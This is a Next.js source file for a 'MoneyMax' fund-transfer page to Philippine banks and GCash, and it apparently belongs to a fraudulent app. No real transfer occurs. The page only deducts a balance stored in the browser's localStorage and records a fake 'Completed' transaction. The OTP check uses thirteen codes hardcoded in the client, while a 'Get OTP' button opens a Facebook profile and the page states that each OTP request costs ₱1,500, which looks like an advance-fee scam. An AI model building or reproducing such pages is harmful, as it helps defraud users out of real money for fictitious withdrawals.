"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ArrowLeft, Send, Shield, CheckCircle, ExternalLink } from "lucide-react"
import Link from "next/link"
import { useRouter } from "next/navigation"

export default function TransferPage() {
  const router = useRouter()
  const [currentStep, setCurrentStep] = useState(1)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [otp, setOtp] = useState("")
  const [otpError, setOtpError] = useState("")
  const [transferData, setTransferData] = useState({
    method: "",
    bankName: "",
    accountName: "",
    accountNumber: "",
    amount: "",
  })

  // Valid OTP codes (in production, these would be generated server-side)
  const validOtps = [
    "356667",
    "887555",
    "246789",
    "790986",
    "566447",
    "378899",
    "145667",
    "899976",
    "356788",
    "468999",
    "087644",
    "356888",
    "357886",
  ]

  const validateStep1 = () => {
    const newErrors: Record<string, string> = {}

    if (!transferData.method) newErrors.method = "Transfer method is required"
    if (!transferData.bankName) newErrors.bankName = "Bank name is required"
    if (!transferData.accountName.trim()) newErrors.accountName = "Account name is required"
    if (!transferData.accountNumber) {
      newErrors.accountNumber = "Account number is required"
    } else if (!/^\d{8,15}$/.test(transferData.accountNumber)) {
      newErrors.accountNumber = "Account number must be between 8 and 15 digits"
      }
    
    if (!transferData.amount) {
      newErrors.amount = "Amount is required"
    } else if (Number.parseFloat(transferData.amount) < 100) {
      newErrors.amount = "Minimum transfer amount is ₱100"
    } else if (Number.parseFloat(transferData.amount) > 50000) {
      newErrors.amount = "Maximum transfer amount is ₱50,000 per transaction"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleContinue = () => {
    if (validateStep1()) {
      setCurrentStep(2)
    }
  }

  const handleGetOtp = () => {
    window.open("https://www.facebook.com/profile.php?id=61577793063769", "_blank")
  }

  const handleConfirmTransfer = () => {
    if (!otp) {
      setOtpError("Please enter OTP code")
      return
    }

    if (!validOtps.includes(otp)) {
      setOtpError("❌ Invalid OTP code. Please request a new code and try again.")
      return
    }

    // Valid OTP - process transfer
    setCurrentStep(3)

    setTimeout(() => {
      // Update user balance
      const userData = JSON.parse(localStorage.getItem("moneymax_user") || "{}")
      userData.availableBalance = (userData.availableBalance || 0) - Number.parseFloat(transferData.amount)
      localStorage.setItem("moneymax_user", JSON.stringify(userData))

      // Enhanced transaction logging
      const transactions = JSON.parse(localStorage.getItem("moneymax_transactions") || "[]")
      const reference = `REF${Date.now().toString().slice(-6)}`
      const newTransaction = {
        id: `TXN${Date.now()}`,
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString(),
        type: "Transfer",
        status: "Completed",
        amount: Number.parseFloat(transferData.amount),
        fee: 15,
        totalAmount: Number.parseFloat(transferData.amount) + 15,
        description: `Transfer to ${transferData.accountName} (${transferData.bankName})`,
        reference: reference,
        accountNumber: transferData.accountNumber,
        method: transferData.method,
        userId: userData.email,
      }
      transactions.unshift(newTransaction)
      localStorage.setItem("moneymax_transactions", JSON.stringify(transactions))

      // Update registered users database
      const registeredUsers = JSON.parse(localStorage.getItem("moneymax_registered_users") || "[]")
      const userIndex = registeredUsers.findIndex((user: any) => user.email === userData.email)
      if (userIndex !== -1) {
        registeredUsers[userIndex] = userData
        localStorage.setItem("moneymax_registered_users", JSON.stringify(registeredUsers))
      }

      // Show success popup notification
      alert(
        `✅ Transfer Successful! ₱${Number.parseFloat(transferData.amount).toLocaleString()} has been sent to ${transferData.accountName}.`,
      )

      // Redirect to success page with transfer details
      const params = new URLSearchParams({
        amount: transferData.amount,
        method: transferData.method,
        bankName: transferData.bankName,
        accountName: transferData.accountName,
        accountNumber: transferData.accountNumber,
        reference: reference,
      })

      router.push(`/transfer-success?${params.toString()}`)
    }, 2000)
  }

  const handleInputChange = (field: string, value: string) => {
    setTransferData((prev) => ({ ...prev, [field]: value }))
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: "" }))
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-md mx-auto">
        <div className="mb-6">
          <Link href="/dashboard" className="inline-flex items-center text-blue-600 hover:text-blue-700">
            <ArrowLeft className="h-4 w-4 mr-2" />
            Back to Dashboard
          </Link>
        </div>

        {/* Step 1: Transfer Form */}
        {currentStep === 1 && (
          <Card>
            <CardHeader className="text-center">
              <Send className="h-12 w-12 text-blue-600 mx-auto mb-4" />
              <CardTitle>Fund Transfer</CardTitle>
              <CardDescription>Transfer money to your bank account or GCash</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label>Transfer Method</Label>
                <Select value={transferData.method} onValueChange={(value) => handleInputChange("method", value)}>
                  <SelectTrigger>
                    <SelectValue placeholder="Select transfer method" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="Bank">Bank</SelectItem>
                    <SelectItem value="GCash">GCash</SelectItem>
                  </SelectContent>
                </Select>
                {errors.method && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.method}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="space-y-2">
                <Label>Bank Name</Label>
                <Select value={transferData.bankName} onValueChange={(value) => handleInputChange("bankName", value)}>
                  <SelectTrigger>
                    <SelectValue placeholder="Select bank" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="BDO">BDO Unibank</SelectItem>
                    <SelectItem value="BPI">Bank of the Philippine Islands</SelectItem>
                    <SelectItem value="Metrobank">Metrobank</SelectItem>
                    <SelectItem value="Landbank">Land Bank of the Philippines</SelectItem>
                    <SelectItem value="PNB">Philippine National Bank</SelectItem>
                    <SelectItem value="UnionBank">UnionBank</SelectItem>
                    <SelectItem value="Security Bank">Security Bank</SelectItem>
                    <SelectItem value="RCBC">Rizal Commercial Banking Corporation</SelectItem>
                    <SelectItem value="GCash">GCash</SelectItem>
                  </SelectContent>
                </Select>
                {errors.bankName && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.bankName}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="space-y-2">
                <Label>Account Name</Label>
                <Input
                  value={transferData.accountName}
                  onChange={(e) => handleInputChange("accountName", e.target.value)}
                  placeholder="Enter account holder name"
                />
                {errors.accountName && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.accountName}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="space-y-2">
                <Label>Account Number</Label>
                <Input
                  value={transferData.accountNumber}
                  onChange={(e) => handleInputChange("accountNumber", e.target.value.replace(/\D/g, "").slice(0, 15))}
                  placeholder="11-digit account number"
                  maxLength={15}
                />
                {errors.accountNumber && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.accountNumber}</AlertDescription>
                  </Alert>
                )}
              </div>

              <div className="space-y-2">
                <Label>Amount (₱)</Label>
                <Input
                  type="number"
                  value={transferData.amount}
                  onChange={(e) => handleInputChange("amount", e.target.value)}
                  placeholder="Enter amount"
                  min="1"
                />
                {errors.amount && (
                  <Alert variant="destructive">
                    <AlertDescription>{errors.amount}</AlertDescription>
                  </Alert>
                )}
              </div>

              <Button onClick={handleContinue} className="w-full">
                Continue
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Step 2: Verify Transfer */}
        {currentStep === 2 && (
          <Card>
            <CardHeader className="text-center">
              <Shield className="h-12 w-12 text-blue-600 mx-auto mb-4" />
              <CardTitle>Verify Your Transfer</CardTitle>
              <CardDescription>
                Please confirm your transfer details and enter a valid 6-digit OTP code to proceed.
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              {/* Transfer Summary */}
              <Card className="bg-blue-50 border-blue-200 rounded-2xl">
                <CardHeader>
                  <CardTitle className="text-lg">Transfer Summary</CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Amount</span>
                    <span className="font-bold text-blue-600">
                      ₱{Number.parseFloat(transferData.amount).toLocaleString()}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Method</span>
                    <span className="font-medium">{transferData.method}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Bank Name</span>
                    <span className="font-medium">{transferData.bankName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Account Number</span>
                    <span className="font-medium">{transferData.accountNumber}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Account Name</span>
                    <span className="font-medium">{transferData.accountName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Transfer Fee</span>
                    <span className="font-medium">₱15.00</span>
                  </div>
                  <div className="flex justify-between border-t pt-2">
                    <span className="text-gray-600 font-medium">Total Amount</span>
                    <span className="font-bold text-blue-600">
                      ₱{(Number.parseFloat(transferData.amount) + 15).toLocaleString()}
                    </span>
                  </div>
                </CardContent>
              </Card>

              {/* OTP Section */}
              <div className="space-y-4">
                <div>
                  <Label>Enter 6-Digit OTP</Label>
                  <Input
                    type="text"
                    value={otp}
                    onChange={(e) => {
                      setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
                      setOtpError("")
                    }}
                    placeholder="Enter 6-digit OTP"
                    maxLength={6}
                    className="text-center text-lg tracking-widest"
                  />
                  {otpError && (
                    <Alert variant="destructive" className="mt-2">
                      <AlertDescription>{otpError}</AlertDescription>
                    </Alert>
                  )}
                </div>

                <div className="text-center space-y-3">
                  <p className="text-sm text-gray-600">Click below to request your OTP code.</p>
                  <Button onClick={handleGetOtp} variant="outline" className="w-full bg-transparent">
                    <ExternalLink className="h-4 w-4 mr-2" />
                    Get OTP
                  </Button>
                  <p className="text-xs text-orange-600 font-medium">Important: ₱1,500 charged per OTP request</p>
                </div>
              </div>

              <Button onClick={handleConfirmTransfer} className="w-full" disabled={!otp}>
                Confirm Transfer
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Step 3: Processing */}
        {currentStep === 3 && (
          <Card>
            <CardHeader className="text-center">
              <CheckCircle className="h-12 w-12 text-green-600 mx-auto mb-4" />
              <CardTitle className="text-green-600">Transfer Completed ✅</CardTitle>
              <CardDescription>Your transfer is being processed...</CardDescription>
            </CardHeader>
            <CardContent className="text-center">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"></div>
              <p className="mt-4 text-gray-600">Please wait while we complete your transfer...</p>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
